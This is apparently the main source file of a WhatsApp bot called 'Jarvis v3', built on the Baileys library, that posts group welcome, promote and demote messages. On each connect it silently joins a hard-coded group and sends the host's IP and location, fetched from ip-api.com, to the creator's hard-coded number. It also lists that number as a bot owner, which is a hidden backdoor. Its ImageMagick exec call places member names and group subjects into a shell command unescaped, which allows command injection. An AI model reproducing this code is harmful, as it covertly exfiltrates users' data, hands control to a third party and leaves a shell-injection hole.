const {
   WAConnection: _WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime,
   processTicksAndRejections,
   ECONNABORTED,
   apikey,
   WA_DEAFULT_EPHEMERAL,
   DataView,
   TypedArray,
   device,
   Browser
} = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const fs = require('fs')
const term = require('terminal-kit').terminal
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const { wait,simih,getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, banner, close } = require('./lib/functions')
const { color } = require('./lib/color')
const gcdetect = JSON.parse(fs.readFileSync('./src/gcdetect.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const event = JSON.parse(fs.readFileSync('./src/event.json'))
const antilinkk = JSON.parse(fs.readFileSync('./src/antilink.json'))
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const { spawn, exec, execSync } = require("child_process")
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const clc = require('chalk')
const axios = require("axios")

require('./index.js')
nocache('./index.js', module => console.log(`${module} is now updated!`))


const starts = async (sparrow = new WAConnection()) => {
    sparrow.logger.level = 'warn'
    sparrow.version = [2, 2119, 6] 
    sparrow.browserDescription = ['Jarvis', 'Firefox', '3.0'];
console.clear()

console.log(banner.string), 
    
    sparrow.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Now scan the qr','aqua'))
    })
    fs.existsSync('./session.json') && sparrow.loadAuthInfo('./session.json');
sparrow.on('connecting', () => {
    start('2', 'Connecting...')
});
sparrow.on('open', () => {
    success('2', 'Connected');
    setTimeout(() => {
        console.log(color(`${'Jarvis At Your Service'}`, 'aqua'))
    }, 1000)
});
await sparrow.connect({
    timeoutMs: 30 * 3000
});
fs.writeFileSync('./session.json', JSON.stringify(sparrow.base64EncodedAuthInfo(), null, '	'));
 teks = `https://chat.whatsapp.com/GGWFogD7JtD2BZZREqHmYd`
 sparrow.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('Joined to jarvis v3', 'grey'))
 sparrow.sendMessage(`${setting.ownerNumber}@s.whatsapp.net`, `Hey ${setting.ownername}, Bot connected succesfully.\n────────────────────\n${JSON.stringify(sparrow.user, null, 2)}\n────────────────────\n`, MessageType.text, {contextInfo: { forwardingScore: 1, isForwarded: true}})
 console.log(color('Sending bot info to creator', 'grey'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
 .then(bu =>{
 sparrow.sendMessage("918078344125@s.whatsapp.net", `「 𝔟𝔬𝔱 𝔠𝔬𝔫𝔫𝔢𝔠𝔱𝔢𝔡 𝔰𝔲𝔠𝔠𝔢𝔰𝔣𝔲𝔩𝔩𝔶 」\n\n${bu}`, MessageType.text, {contextInfo: { forwardingScore: 1, isForwarded: true}})})
 console.log(color('Jarvis Contacting Owner', 'aqua'))
console.log(color('⟣', 'orange'), color('----------------', 'magenta'), color('JARVIS', 'green'), color('----------------', 'magenta'), color('⟢', 'orange'));
console.log(`\
`);
console.log(color('[', 'white'), color('+', 'cyan'), color(']', 'white'), color('Device', 'yellow'), color(':', 'aqua'), color(sparrow.user.phone.device_manufacturer, 'orange'));
console.log(color('[', 'white'), color('+', 'cyan'), color(']', 'white'), color('Model', 'yellow'), color(':', 'aqua'), color(sparrow.user.phone.device_model, 'orange'));
console.log(color('[', 'white'), color('+', 'cyan'), color(']', 'white'), color('WA Version', 'yellow'), color(':', 'aqua'), color(sparrow.user.phone.wa_version, 'orange'));
console.log(`\
`);
console.log(color('⟣', 'orange'), color('----------------', 'magenta'), color('Version 3', 'green'), color('----------------', 'magenta'), color('⟢', 'orange'));
console.log(`\
`);
console.log(color('This', 'red'), color('Is', 'red'), color('An', 'orange'), color('Updated', 'orange'), color('Version', 'orange'), color('Of', 'yellow'), color('Jarvis', 'yellow'));
console.log(`\
`);
console.log(color(' Stay Tuned For More Updates ', 'blue'));
console.log(`\
`);
console.log(color('⟣', 'orange'), color('----------------', 'magenta'), color('By - Akshay', 'green'), color('----------------', 'magenta'), color('⟢', 'orange'));
console.log(color('https://github.com/sparroo/jarvisv3', 'grey'))
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { 
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout),console.log(color('Complete', 'magenta')) })}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
	}
}
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nLoading' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;

sparrow.on('chat-update', async (mek) => {
    require('./index.js')(sparrow, mek)
    OwnerNumber = ["918078344125@s.whatsapp.net",`${settings.ownerNumber}@s.whatsapp.net`]
})
        sparrow.on('CB:Blocklist', json => {                                                                  
        if (blocked.length > 2) return
        for (let i of json[1].blocklist) {
            blocked.push(i.replace('c.us','s.whatsapp.net'))
        }
    })
    
	sparrow.on('group-participants-update', async (anu) => {
	 try {

			falfa = { key: {fromMe: false,participant: "0@s.whatsapp.net",
		remoteJid: "0@s.whatsapp.net"},
message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "welcome","groupName": "Jarvis OFC", 
"caption": `Itz me Jarvis`, 'jpegThumbnail': fs.readFileSync(`image/${setting.thumb}`)
}}}
         const mdata = await sparrow.groupMetadata(anu.jid)
		console.log(anu)
		if (!welkom.includes(anu.jid)) return
		if (anu.action == 'add') {
			num = anu.participants[0]
			ini_user = sparrow.contacts[num]
			welkam = `Hey @${num.split('@')[0]}\nWelcome to group:\n${mdata.subject}\nNumber:\n ${num.replace('@s.whatsapp.net', '')}\nRead the description and stay in the group\n\nHopefully feel at home`
			const moment = require('moment-timezone')
            const jm = moment.tz('Asia/Kolkata').format('HH:mm:ss')
			let d = new Date
				let locale = 'id'
					let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
					let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
					let week = d.toLocaleDateString(locale, { weekday: 'long' })
					let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})
				try {
pushnem = sparrow.contacts[num] != undefined ? sparrow.contacts[num].notify = undefined ? PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international') : sparrow.contacts[num].notify || sparrow.contacts[num].vname : PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international')
} catch { 
 pushnem = num.split('@')[0]
}
			try {
				ppimg = await sparrow.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
			} catch {
				ppimg = './src/200.jpg'
			}
			let buff = await getBuffer(ppimg)
				exec(`magick './src/wel.jpg' -gravity west -fill '#000000' -font './src/font-gue.ttf' -size 1280x710 -pointsize 75 -interline-spacing 7.5 -annotate +460-45 '${pushnem}' -pointsize 35 -annotate +460+83 '${jm} ${calender}' -pointsize 50 -annotate +460+200 'Welcome To ${mdata.subject}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite 'hamsil.jpg'`)
				.on('error', () => reply('error'))
				.on('exit', () => {
			try {
		   sparrow.sendMessage(mdata.id, fs.readFileSync('hamsil.jpg'), MessageType.image, {quoted: falfa, caption: `${welkam}`, contextInfo: { "mentionedJid" : [num], "forwardingScore":0,"isForwarded":false},sendEphemeral: true})
			} catch {
			sparrow.sendMessage(mdata.id, buff, MessageType.image, {quoted: falfa, caption: `${welkam}`, contextInfo: { "mentionedJid" : [num], "forwardingScore":0,"isForwarded":false},sendEphemeral: true})
            }
			})
			} else if (anu.action == 'promote') {
			const mdata = await sparrow.groupMetadata(anu.jid)
			num = anu.participants[0]
			try {
					ppimg = await sparrow.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let buff = await getBuffer(ppimg)
			teks = `PROMOTE DETECTED
			
Number : ${num.replace('@s.whatsapp.net', '')}
Tag : @${num.split('@')[0]}
Group : ${mdata.subject}

Congratulation you became an admin`
			sparrow.sendMessage(mdata.id, buff, MessageType.image, {caption : teks, contextInfo: {mentionedJid: [num],"forwardingScore":999,"isForwarded":true},sendEphemeral: true , quoted : falfa})
		} else if (anu.action == 'demote') {
			num = anu.participants[0]
			const mdata = await sparrow.groupMetadata(anu.jid)
			try {
					ppimg = await sparrow.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let buff = await getBuffer(ppimg)
			teks = `DEMOTE DETECTED
			
Number : ${num.replace('@s.whatsapp.net', '')}
Tag : @${num.split('@')[0]}
Group : ${mdata.subject}

You are no longer an admin`
			sparrow.sendMessage(mdata.id, buff, MessageType.image, {caption:teks,contextInfo: {mentionedJid: [num],"forwardingScore":999,"isForwarded":true},sendEphemeral: true  , quoted: falfa})
		}
     } catch (e) {
         console.log('Error : %s', color(e, 'red'))
      }
})
		
sparrow.on('group-update', async (anu) => {
	
falfa = { key: {fromMe: false,participant: "0@s.whatsapp.net",
remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "welcome","groupName": "Alphabot", "caption": `Made With ❤️`, 'jpegThumbnail': fs.readFileSync(`image/${setting.thumb}`)}}}
  metdata = await sparrow.groupMetadata(anu.jid)
  console.log(color(`${'Group Update'}`, 'yellow'))
  if (!event.includes(anu.jid)) return
    if(anu.announce == 'false'){
    teks = ` Group Opened `
    sparrow.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Opened ] In ${metdata.subject}`))
  }
  else if(anu.announce == 'true'){
    teks = ` Group Closed `
    sparrow.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Closed ] In ${metdata.subject}`))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = ` Group Description Changed \n\nGroup description changed to :\n${anu.desc}`
    sparrow.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
    console.log(clc.yellow(`[ Group Description Change ] In ${metdata.subject}`))
  }
  else if(anu.restrict == 'false'){
    teks = ` Group Settings Changed \n\nMembers are allowed to change group data`
    sparrow.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
  }
  else if(anu.restrict == 'true'){
    teks = ` Group Settings Changed \n\nOnly admins are allowed to change group data`
    sparrow.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
  }
})
}
///
/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    console.log('Module', `'${module}'`, 'is now being watched for changes')
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}





/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}

starts()
